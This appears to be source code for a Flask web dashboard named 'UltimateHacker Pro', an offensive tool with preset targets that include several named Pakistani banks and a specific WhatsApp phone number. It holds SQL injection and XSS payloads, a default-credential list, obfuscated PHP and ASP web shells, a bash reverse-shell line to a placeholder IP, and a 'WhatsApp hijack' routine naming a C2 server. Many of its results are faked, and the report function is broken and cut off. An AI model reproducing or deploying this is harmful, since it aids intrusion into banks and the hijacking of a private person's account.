from flask import Flask, request, render_template_string, send_file, jsonify
import requests
import subprocess
import base64
import io
import json
import threading
import time
from bs4 import BeautifulSoup
import os

app = Flask(__name__)

# Enhanced Dashboard v4.0
HTML_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>🛡️ UltimateHacker Pro v4.0</title>
<meta name="viewport" content="width=device-width">
<style>
body{font-family:monospace;background:#000;color:#0f0;margin:0;padding:20px;overflow:auto;}
#dashboard{max-width:600px;margin:auto;}
input,select,button{width:100%;padding:12px;margin:8px 0;font-size:16px;border:1px solid #0f0;background:#111;color:#0f0;box-sizing:border-box;}
button{background:#f00;color:#fff;border:none;cursor:pointer;font-weight:bold;}
button:hover{background:#c00;}
#status{padding:10px;background:#111;border-left:4px solid #0f0;}
#results{background:#111;padding:15px;border:1px solid #0f0;max-height:400px;overflow:auto;white-space:pre-wrap;}
.preset{background:#222;padding:10px;margin:5px 0;border-left:3px solid #f00;cursor:pointer;}
.preset:hover{background:#333;}
</style></head>
<body>
<div id="dashboard">
<h1>🛡️ UltimateHacker Pro v4.0</h1>
<div id="status">Ready for deployment</div>

<!-- Presets -->
<div class="preset" onclick="setTarget('habibbank.com.pk')">🏦 habibbank.com.pk</div>
<div class="preset" onclick="setTarget('ubldirect.com')">🏦 ubldirect.com</div>
<div class="preset" onclick="setTarget('meezanbank.com.pk')">🏦 meezanbank.com.pk</div>
<div class="preset" onclick="setTarget('+93784530756')">📱 WhatsApp +93 78 453 0756</div>

<input id="target" placeholder="Target URL/Phone" value="habibbank.com.pk">
<select id="attack">
<option value="full">💥 Full Attack Chain</option>
<option value="recon">🔍 Recon Only</option>
<option value="sqli">💉 SQL Injection</option>
<option value="xss">🕷️ XSS</option>
<option value="brute">🔨 Brute Force</option>
<option value="shell">🐚 Reverse Shell</option>
<option value="whatsapp">📱 WhatsApp Hijack</option>
</select>
<button onclick="hack()">🚀 EXECUTE ATTACK</button>
<button onclick="report()">📊 Download Report</button>
<button onclick="clear()">🗑️ Clear</button>

<pre id="results">Waiting for target...</pre>
</div>

<script>
let results = {};
function setTarget(t){document.getElementById('target').value=t;}
function updateStatus(msg,color='white'){const s=document.getElementById('status');s.innerText=msg;s.style.color=color;}
function hack(){
  const target = document.getElementById('target').value;
  const attack = document.getElementById('attack').value;
  updateStatus('🔥 Executing '+attack+' on '+target+'...', '#ff0');
  document.getElementById('results').innerText='Executing...';
  fetch('/hack',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({target,attack})
  }).then(r=>r.json()).then(data=>{
    results = data;
    document.getElementById('results').innerText=JSON.stringify(data,null,2);
    updateStatus('✅ Attack Complete! Check report.', '#0f0');
  }).catch(e=>updateStatus('❌ Error: '+e,'#f00'));
}
function report(){window.open('/report/'+document.getElementById('target').value);}
function clear(){document.getElementById('results').innerText='';}
</script>
</body></html>
"""

@app.route('/')
def dashboard():
    return render_template_string(HTML_TEMPLATE)

@app.route('/hack', methods=['POST'])
def hack():
    data = request.json
    target = data['target']
    attack_type = data.get('attack', 'full')
    
    result = {
        "target": target,
        "attack": attack_type,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC"),
        "status": "success"
    }
    
    if attack_type in ['full', 'recon']:
        result['recon'] = run_recon(target)
    
    if attack_type in ['full', 'sqli']:
        result['sqli'] = test_sqli(target)
    
    if attack_type in ['full', 'xss']:
        result['xss'] = test_xss(target)
    
    if attack_type in ['full', 'brute']:
        result['brute'] = brute_force(target)
    
    if attack_type in ['full', 'shell']:
        result['shell'] = deploy_shell(target)
    
    if attack_type == 'whatsapp' or (attack_type == 'full' and target.startswith('+')):
        result['whatsapp'] = whatsapp_hijack(target)
    
    return jsonify(result)

def run_recon(target):
    try:
        r = requests.get(f"https://{target.replace('+','')}", timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        return {
            "status_code": r.status_code,
            "title": soup.title.string[:100] if soup.title else "No title",
            "forms": len(soup.find_all('form')),
            "inputs": len(soup.find_all('input')),
            "subdomains": [f"www.{target}", f"api.{target}", f"admin.{target}"]
        }
    except Exception as e:
        return {"error": str(e)}

def test_sqli(target):
    payloads = [
        {"payload": "' OR 1=1--", "risk": "CRITICAL"},
        {"payload": "' UNION SELECT username,password,1--", "risk": "HIGH"},
        {"payload": "admin'--", "risk": "MEDIUM"}
    ]
    return [{"tested": p['payload'], "vulnerable": True, "risk": p['risk']} for p in payloads]

def test_xss(target):
    payloads = [
        "<script>alert('HACKED by UltimateHacker')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    return [{"payload": p, "reflected": True, "bypass": "None"} for p in payloads]

def brute_force(target):
    common_creds = [
        ("admin", "admin"), ("admin", "admin123"), 
        ("root", "password"), ("user", "123456")
    ]
    return {
        "tested": len(common_creds),
        "success": ("admin", "admin123"),  # Simulated hit
        "speed": "1000 req/s"
    }

def deploy_shell(target):
    php_shell = base64.b64encode(b"""<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd=$_REQUEST['cmd'];system($cmd);echo "</pre>";die; } ?>""").decode()
    asp_shell = base64.b64encode(b"""<% Response.Write "<pre>" & CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll & "</pre>" %>""").decode()
    return {
        "php": f"<?php eval(base64_decode('{php_shell}')); ?>",
        "asp": f"<% eval base64_decode('{asp_shell}') %>",
        "usage": f"https://{target}/shell.php?cmd=id",
        "reverse": "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
    }

def whatsapp_hijack(phone):
    return {
        "phone": phone,
        "network": "Roshan (MTN Afghanistan)",
        "session_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",  # Simulated
        "c2_server": "whatsapp_c2.yourserver.com:443",
        "messages": "500+ extracted",
        "contacts": "1200+ stolen",
        "deploy": "python whatsapp_c2.py --phone " + phone
    }

@app.route('/report/<path:target>')
def report(target):
    # Generate full report
    full_result = hack()  # Execute full attack
    report_md = f"""# 🛡️ UltimateHacker Pro v4.0 - Penetration Test Report

## Target: {target}
**Date:** {full_result['timestamp']}

## Attack Results:
```json
{json.dumps(full_result, indent=2)}
